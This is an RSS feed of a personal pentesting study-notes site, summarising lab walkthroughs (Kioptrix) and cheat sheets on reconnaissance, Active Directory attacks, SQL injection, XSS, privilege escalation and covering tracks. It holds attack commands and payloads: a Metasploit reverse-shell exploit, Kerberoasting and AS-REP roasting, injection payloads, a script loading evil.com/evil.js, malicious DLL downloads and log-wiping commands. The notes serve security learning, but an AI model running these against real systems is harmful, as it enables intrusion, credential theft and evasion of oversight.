<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/</link>
    <description>Recent content on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 17 Jan 2024 11:58:47 +0530</lastBuildDate>
    <atom:link href="https://documentnation.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Kioptrix</title>
      <link>https://documentnation.github.io/docs/tcm-peh/exploitation/kioptrix/</link>
      <pubDate>Thu, 11 Jan 2024 17:06:50 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/exploitation/kioptrix/</guid>
      <description> Metasploit link use exploit/linux/samba/trans2open set rhosts 192.168.215.112 set lhost 192.168.215.151 run But this won&amp;rsquo;t work.&#xA;In order this to work, I have to change the payload to stageless payload.&#xA;set payload linux/x86/shell_reverse_tcp run Manual Exploitation link git clone https://github.com/heltonWernik/OpenLuck.git cd OpenLuck gcc -o OpenFuck OpenFuck.c -lcrypto ./OpenFuck 0x6b 192.168.215.112 443 -c 40 Reference:&#xA;https://github.com/heltonWernik/OpenLuck.git </description>
    </item>
    <item>
      <title>Kioptrix</title>
      <link>https://documentnation.github.io/docs/tcm-peh/enumeration/kioptrix/</link>
      <pubDate>Thu, 11 Jan 2024 13:38:46 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/enumeration/kioptrix/</guid>
      <description>Find the Target IP linkarp-scan link arp-scan -l In this case, my target IP address is 192.168.215.112.&#xA;ping linkLogin to the target machine with john:TwoCows2 credentials. (cheat)&#xA;ssh -oKexAlgorithms=&amp;#43;diffie-hellman-group1-sha1 -oHostKeyAlgorithms=&amp;#43;ssh-dss -c aes128-cbc john@192.168.215.112 Then ping some random IP to find the source IP which is the target IP.&#xA;ping 8.8.8.8 netdiscover link sudo netdiscover -r 192.168.215.0/24 Enumeration linkKioptrix walkthrough will not be added here as it is an very easy box and I can find so many detailed walkthroughs from the internet if want.</description>
    </item>
    <item>
      <title>Identifying My Target</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/identifying/</link>
      <pubDate>Sun, 07 Jan 2024 09:30:19 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/identifying/</guid>
      <description>Identifing Our Target linkNeed to identify What&amp;rsquo;s within the SCOPE and What&amp;rsquo;s not.&#xA;Example: https://bugcrowd.com/tesla</description>
    </item>
    <item>
      <title>Email Hunting</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/email_discovery/</link>
      <pubDate>Sat, 06 Jan 2024 19:38:29 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/email_discovery/</guid>
      <description>Discovering Email Addresses linkHunter.io linkhunter.io also can identify the pattern of the email address.&#xA;In this case it is {f}{last}@tesla.com which means {fist name initial}{last name}@tesla.com&#xA;If I had an account created, I can see alot more information about the email addresses of the target.&#xA;Phonebook.cz link Clearbit linkThis is also a fantastic Chrome Extension that allows me to discover email addresses with some other cool details that other tools did not find.</description>
    </item>
    <item>
      <title>Credential Hunting</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/credentials_hunting/</link>
      <pubDate>Sun, 07 Jan 2024 09:35:30 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/credentials_hunting/</guid>
      <description> Dehashed linkThis is a website which costs money but definitely worth it.&#xA;With this I can browse through all the breached databases and find potential credentials in many ways.&#xA;Reference:&#xA;https://dehashed.com/ </description>
    </item>
    <item>
      <title>Subdomain Hunting</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/subdomain_hunting/</link>
      <pubDate>Thu, 11 Jan 2024 08:54:47 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/subdomain_hunting/</guid>
      <description> Sublist3r link sublist3r.py -d tesla.com -o sub.tesla.com.log crt.sh linkWith this website, I can find subdomains of a domain by Certificate Fingerprinting.&#xA;httprobe linkI can check if all the subdomains that I found ealier are up or not with this tool.&#xA;cat /opt/Sublist3r/sub.tesla.com.log | httprobe Reference:&#xA;https://github.com/aboul3la/Sublist3r https://crt.sh/ https://github.com/tomnomnom/httprobe </description>
    </item>
    <item>
      <title>Web Technologies</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/web_technologies/</link>
      <pubDate>Thu, 11 Jan 2024 09:34:51 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/web_technologies/</guid>
      <description>BuiltWith linkWith this website, I can find what technologies does the target websited utilizes.&#xA;Wappalyzer linkSimilar to BuiltWith.com, with this website I can find what technologies does the target websited utilizes.&#xA;Wappalyzer also has browser extensions that comes in handy when it comes to time management.&#xA;Wappalyzer also considers as active scanning tool according to how the tool gather information from the website&#xA;Whatweb link whatweb https://book.hacktricks.xyz Reference:&#xA;https://builtwith.com/ https://www.</description>
    </item>
    <item>
      <title>Google Fu</title>
      <link>https://documentnation.github.io/docs/tcm-peh/reconnaissance/google_fu/</link>
      <pubDate>Thu, 11 Jan 2024 11:15:42 +0530</pubDate>
      <guid>https://documentnation.github.io/docs/tcm-peh/reconnaissance/google_fu/</guid>
      <description> Filter Domain link site:tesla.com Exclude Keywords link site:tesla.com -shop Filter Filetypes link site:tesla.com filetype:pdf Filter Keywords Within the URL link site:tesla.com inurl:php?id= This way I can find potential SQL injectable websites as well.&#xA;Reference:&#xA;https://ahrefs.com/blog/google-advanced-search-operators/ </description>
    </item>
    <item>
      <title>Elasticsearch Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/elasticsearch/elasticsearch-pentesting/</guid>
      <description>Default Credentials link admin:elasticadmin elastic:changeme Brute Force Credentials linkCrack the &amp;ldquo;Authorization&amp;rdquo; header in the web page.&#xA;hydra -L usernames.txt -P passwords.txt &amp;lt;target-ip&amp;gt; -s 9200 http-get / Common Directories link /_cat/ /_cat/indices /_cluster/ /_nodes/ /_remote/ /_security /_search?q=username /_search?q=password /_security/role /_security/user /_xpack/security/user/ </description>
    </item>
    <item>
      <title>Joomla CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/joomla-cms-pentesting/</guid>
      <description>Scan link joomscan -u https://example.com Common Directories link /administrator/ /administrator/manifests/files/joomla.xml /cache/ /components/ /configuration.php /htaccess.txt /includes/ /index.php /joomla.xml /language/en-GB/en-GB.xml /libraries/ /LICENSE.txt /logs/ /media/ /modules/ /plugins/ /README.txt /templates/ /tmp/ Default Credentials linkThe default username is &amp;ldquo;admin&amp;rdquo; and no password.</description>
    </item>
    <item>
      <title>Web Content Discovery</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-content-discovery/</guid>
      <description>Manual Discovery link # Settings files /robots.txt /security.txt /.well-known/security.txt /.well-known/apple-app-site-association /.well-known/assetlinks.json /sitemap.xml /sitemaps.xml # JavaScript files /main.js /script.js /js/jquery.min.js /js/main.js /js/script.js # CGI scripts /cgi-bin/example.cgi # Wave dashes /~files/ /~hidden/ # PHP files /index.php /config.php /403.php /404.php # Python files /main.py /module.py /module/__init__.py /modules/__init__.py __init__.py config.ini project.wsgi # Archives /example.zip /backup.zip /backups.zip # Backup files /example.bak /example.jpg.bak /images/example.jpg.bak # Directories /admin/ /blog/ # Sensitive information /.env # GitHub /README.md /.git /.</description>
    </item>
    <item>
      <title>AS-REP Roasting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/as-rep-roasting/</guid>
      <description>Enumeration linkLists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.&#xA;impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/ -no-pass -usersfile users.txt impacket-GetNPUsers -dc-ip &amp;lt;target-ip&amp;gt; example.local/&amp;lt;username&amp;gt; -no-pass -format hashcat # Without authenticatino netexec ldap &amp;lt;target-ip&amp;gt; -u users.txt -p &amp;#39;&amp;#39; --asreproast output.txt # With authentication netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --asreproast output.txt If we find a password hash, crack it.&#xA;john --format=krb5asrep --wordlist=wordlist.txt hash.txt # or hashcat -m 18200 -a 0 hash.</description>
    </item>
    <item>
      <title>Kerberoasting Attack</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/kerberoasting-attack/</guid>
      <description>Attack linkIf we have a password hash of a user, we might be able to find another user credential using the hash.&#xA;impacket-GetUserSPNs -hashes &amp;lt;lmhash&amp;gt;:&amp;lt;nthash&amp;gt; example.local/username -outputfile hashes.txt # Without pre-authentication # -no-preauth: https://github.com/SecureAuthCorp/impacket/pull/1413 impacket-GetUserSPNs -no-preauth username -usersfile users.txt -dc-host &amp;lt;ip-or-host&amp;gt; example.local/ netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --kerberoasting output.txt netexec ldap &amp;lt;target-ip&amp;gt; -u &amp;#39;&amp;#39; -p &amp;#39;&amp;#39; --kerberoasting output.txt After finding hashes, we can crack it or use for pass-the-hash attack.</description>
    </item>
    <item>
      <title>LDAP (Lightweight Directory Access Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ldap-pentesting/</guid>
      <description>Enumeration link # Nmap nmap --script ldap-brute --script-args ldap.base=&amp;#39;&amp;#34;cn=users,dc=cqure,dc=net&amp;#34;&amp;#39; -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-search -p 389 &amp;lt;target-ip&amp;gt; nmap --script ldap-* -p 389 &amp;lt;target-ip&amp;gt; nmap --script &amp;#34;ldap* and not brute&amp;#34; -p 389 &amp;lt;target-ip&amp;gt; # NetExec # -k: Use Kerberos authentication netexec ldap &amp;lt;target-ip&amp;gt; -u usernames.txt -p &amp;#39;&amp;#39; -k # --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION` # reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions netexec ldap &amp;lt;target-ip&amp;gt; -u username -p password --trusted-for-delegation Search LDAP linkBelows are defined in LDAP.</description>
    </item>
    <item>
      <title>Shadow Credentials</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/shadow-credentials/</guid>
      <description>Exploit linkIf the attacker can modify the target object&amp;rsquo;s (user or computer account) attribute msDS-KeyCredentialLink and append it with alternate credentials in the form of certificates, he takes over the account in AD.&#xA;Using Certipy link # -k: Use Kerberos authentication certipy shadow auto -account &amp;#34;targetuser&amp;#34; -u &amp;#34;username@example.local&amp;#34; -p &amp;#39;password&amp;#39; -dc-ip 10.0.0.1 -target dc.example.local -k Using Whisker linkWhisker is a C# tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute.</description>
    </item>
    <item>
      <title>SMB (Server Message Block) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/smb-pentesting/</guid>
      <description>Enumeration linkTo enumerate automatically, we can use various tools such as nmap, smbclient, and so on&#xA;nmap --script smb-brute -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum-shares.nse,smb-enum-users.nse -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-enum* -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-protocols -p 445 &amp;lt;target-ip&amp;gt; nmap --script smb-vuln* -p 445 &amp;lt;target-ip&amp;gt; # NetBIOS names nmblookup -A 10.0.0.1 nbtscan 10.0.0.1 # Enum4linux enum4linux &amp;lt;target-ip&amp;gt; # All enumeration enum4linux -a &amp;lt;target-ip&amp;gt; # Verbose enum4linux -v &amp;lt;target-ip&amp;gt; # Specify username and password enum4linux -u username -p password &amp;lt;target-ip&amp;gt; # Enum4linux-ng # -A: All simple enumeration including nmblookup enum4linux-ng -A &amp;lt;target-ip&amp;gt; # -As: All simple short enumeration without NetBIOS names lookup enum4linux-ng -As &amp;lt;target-ip&amp;gt; # -u: Specific username # -p: Specific password enum4linux-ng -u &amp;#34;administrator&amp;#34; -p &amp;#34;password&amp;#34; &amp;lt;target-ip&amp;gt; # NetExec (https://www.</description>
    </item>
    <item>
      <title>SQL Injection Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</guid>
      <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
    </item>
    <item>
      <title>UAC Windows Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/uac-windows-privilege-escalation/</guid>
      <description>Automation linkUACME is an automation tool for defeating Windows UAC.&#xA;Investigation link # Check the current user&amp;#39;s integrity level whoami /groups | findstr &amp;#34;Label&amp;#34; whoami /groups | find &amp;#34;Label&amp;#34; UAC Bypass linkAZMAN.MSC (Authorization Manager) link Open AZMAN.MSC by entering “azman.msc” in the Run. Click Help and select Help Topics. The MMC window will open. In the MMC window, right-click and select View Source. The Notepad opens. In the Notepad, select File → Open.</description>
    </item>
    <item>
      <title>Web Login Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</guid>
      <description>Common Default Credentials linkCheck if the website has not changed credential from the default username/password.&#xA;admin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1-- or true-- &amp;#39; or true-- UNION SELECT null-- &amp;#39; UNION SELECT null-- &amp;#39; UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link &amp;#39;-- &amp;#39; or 1=1-- &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- }&amp;#34; or 1=1-- MySQL link &amp;#39;-- - &amp;#39;# &amp;#39; or 1=1# &amp;#39; or 1=1-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# }&amp;#34; or 1=1-- - NoSQL Injection linkReference: https://portswigger.</description>
    </item>
    <item>
      <title>Windows PrivEsc with Registry Keys</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-registry-keys/</guid>
      <description>Investigation linkFind interesting registry or values in registry keys.&#xA;# HKLM: HKEY_LOCAL_MACHINE reg query HKLM reg query HKLM\SAM reg query HKLM\SAM\SAM reg query HKLM\SECURITY reg query HKLM\SOFTWARE reg query HKLM\SYSTEM # Find user credentials reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon” # HKU: HKEY_USERS reg query HKU reg query HKU\S-1-2-3 # HKCU: HKEY_CURRENT_USER reg query HKCU reg query HKCU\System Reveal Password from Registry Hives linkA hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.</description>
    </item>
    <item>
      <title>Windows PrivEsc with SeBackupPrivilege</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</guid>
      <description>Investigation linkFirst check if the current user has SeBackupPrivilege in the privilege information.&#xA;whoami /all If so, we can read arbitrary files on the system include administrator&amp;rsquo;s files, SAML file, SYSTEM registry file, etc.&#xA;Exploitation (Read Sensitive Files) link1. Download &amp;amp; Upload Malicious DLLs linkIn local machine, download malicious dlls from here&#xA;# If powershell, Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll Invoke-WebRequest -Uri http://10.0.0.1:8000/SeBackupPrivilegeCmdLets.dll -OutFile .\SeBackupPrivilegeCmdLets.dll # If winrm, upload SeBackupPrivilegeUtils.dll upload SeBackupPrivilegeCmdLets.</description>
    </item>
    <item>
      <title>WordPress Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</link>
      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/wordpress-pentesting/</guid>
      <description>Enumeration link nmap --script http-wordpress-brute nmap --script http-wordpress-enum --script-args type=&amp;#34;plugins&amp;#34;,search-limit=1500 -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-users -p 80 &amp;lt;target-ip&amp;gt; nmap --script http-wordpress-* -p 80 &amp;lt;target-ip&amp;gt; WpScan linkWpscan is a WordPress security scanner which can brute force credentials.&#xA;wpscan --url http://&amp;lt;target-ip&amp;gt; -P wordlist.txt # --rua: random user agent # --http-auth username:password # -e: enumerate # ap: All plugins # at: All themes # tt: Timthumbs # cb: Config backups # dbe: Db exports # u: User IDs range # m: Media IDs range wpscan --rua -e ap,at,tt,cb,dbe,u,m --url https://vulnerable.</description>
    </item>
    <item>
      <title>Burp Suite Troubleshooting</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/burp-suite-troubleshooting/</link>
      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/burp-suite-troubleshooting/</guid>
      <description>Fix Error “Failed to connect to x.x.x.x:443” linkIf we try to HTTP access rather than HTTPS, This error occurs because the Burp’s embedded browser uses secure connections automatically by default.&#xA;If we got the error, we may be able to solve the problem by the following methods:&#xA;In the embedded browser, open Settings by clicking on three dots menu icon. Once Settings screen opens, go to “Privacy and security” → “Security”.</description>
    </item>
    <item>
      <title>Crack 7z Password</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/crack-7z-password/</link>
      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/crack-7z-password/</guid>
      <description>Crack link 7z2john example.7z &amp;gt; hash.txt # or /usr/share/john/7z2john.pl example.7z &amp;gt; hash.txt john --wordlist=wordlist.txt hash.txt If we got the error “Can&#39;t locate Compress/Raw/Lzma.pm in @INC&amp;hellip;”, we need to install libcompress-raw-lzma-perl package so try:&#xA;sudo apt install libcompress-raw-lzma-perl </description>
    </item>
    <item>
      <title>XSS (Cross-Site Scripting)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</link>
      <pubDate>Tue, 28 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss/</guid>
      <description>Payloads linkWe can insert them into URL params, POST params or HTTP headers.&#xA;Additionary, we can also find CVE related XSS here.&#xA;Script Tags link &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;#39;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;onerror=alert;throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;{onerror=alert}throw 123&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;throw onerror=alert,&amp;#39;hello&amp;#39;,123,&amp;#39;world&amp;#39;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;fetch(&amp;#39;/profile?new_password=password&amp;#39;);&amp;lt;/script&amp;gt; &amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; %3Cscript%3Ealert%281%29%3C%2Fscript%3E &amp;#39;;alert(1);&amp;#39; In addition, we may be able to execute our JavaScript file which is hosted on our server.&#xA;&amp;lt;script src=&amp;#34;https://evil.com/evil.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; Img Tags link &amp;#34; src=1 onerror=alert(1)&amp;gt; &amp;lt;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=1 onerror=alert(1)&amp;gt; &amp;lt;img src=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x09;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=&amp;#34;jav&amp;amp;#x0A;ascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img dynsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img lowsrc=&amp;#34;javascript:alert(1)&amp;#34;&amp;gt; &amp;lt;img src=http://10.</description>
    </item>
    <item>
      <title>Cover Your Tracks in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/cover-your-tracks-in-linux/</link>
      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/cover-your-tracks-in-linux/</guid>
      <description>Clear History link unset HISTORY echo &amp;#39;&amp;#39; &amp;gt; ~/.bash_history echo &amp;#39;&amp;#39; &amp;gt; /root/.bash_history history -c export HISTSIZE=0 unset HISTFILE Clear Logs link # Shrink the size of log files with `truncate -s 0` truncate -s 0 /var/log/auth.log echo &amp;#39;&amp;#39; &amp;gt; /var/log/auth.log cat /dev/null &amp;gt; /var/log/auth.log &amp;gt; /var/log/auth.log dd if=/dev/null of=/var/log/auth.log shred /var/log/auth.log </description>
    </item>
    <item>
      <title>Broken Access Control</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/broken-access-control/</guid>
      <description>Change Header Values linkCookie linkWe may be able to get access to the login-required pages.&#xA;Cookie: admin=true Cookie: isAdmin=true Cookie: access=1 Cookie: access=true # Insert another user value Cookie: session=&amp;lt;another_user_value&amp;gt; Cookie: access_token=&amp;lt;another_user_value&amp;gt; IP Spoofing link Cluster-Client-IP: 127.0.0.1 Forwarded-For: 127.0.0.1 X-Forwarded: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Original-URL: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-ProxyUser-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Remote-IP: 127.0.0.1 Host: 127.0.0.1 User Agent linkSometimes we can access another server by replacing the User Agent with the specific one.</description>
    </item>
    <item>
      <title>Bypass Client/Server Side Filter</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/bypass-client-server-side-filter/</guid>
      <description>1. Disable Filter linkDisable Client-Side (JS) Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Client Requests section, then click on the top line (File extension&amp;hellip;) then click Edit. The popup will open. In the popup, find and remove |^js$ in Match condition, then save the filter. Disable Server-Side Filter link In Burp Suite, go to Proxy tab and click Options. Navigate to Intercept Server Requests section and check Intercept responses based on&amp;hellip;.</description>
    </item>
    <item>
      <title>Download Files in Windows</title>
      <link>https://documentnation.github.io/docs/hdks/windows/technique/download-files-in-windows/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/technique/download-files-in-windows/</guid>
      <description>Using Invoke-WebRequest linkWe can use Invoke-WebRequest command&#xA;# In PowerShell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt # In CMD, we need to call `powershell` or `powershell.exe` command. powershell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt powershlel IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt </description>
    </item>
    <item>
      <title>File Transfer in Linux</title>
      <link>https://documentnation.github.io/docs/hdks/linux/management/file-transfer-in-linux/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/management/file-transfer-in-linux/</guid>
      <description>Using Wget linkIn machine A, Start a web server.&#xA;python -m http.server # We can specify which directory to host by `--directory` option. python -m http.server --directory /usr/bin In machine B, download a file from the web server of machine A.&#xA;wget http://&amp;lt;ip-for-machine-A&amp;gt;:8000/example.txt # Download recursively # -r: recursive # -np: no parent # Don&amp;#39;t forget &amp;#34;/&amp;#34; after the directory name wget -r -np http://&amp;lt;ip-for-machine-A&amp;gt;/somedir/ Using Netcat linkTransfer a File linkIn machine A, start a listener for receiving a file.</description>
    </item>
    <item>
      <title>File Upload Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/file-upload-attack/</guid>
      <description>Check Allowed File Formats linkFirst off, we need to know what file types are allowed to be uploaded in target website.&#xA;Try to upload any formats.&#xA;.php, .php3, .php4, .php5, .phtml, .phar .jpg, jpeg, .png, .gif .bmp .pdf .js .exe, .dll, .asp, .aspx .py .go .rs Create Blank Files for Each Format linkTo create a blank file for the checking purpose, execute the following command.&#xA;jpg, png # https://superuser.com/questions/294943/is-there-a-utility-to-create-blank-images convert -size 32x32 xc:white test.</description>
    </item>
    <item>
      <title>Login Windows Shell</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/login-windows-shell/</guid>
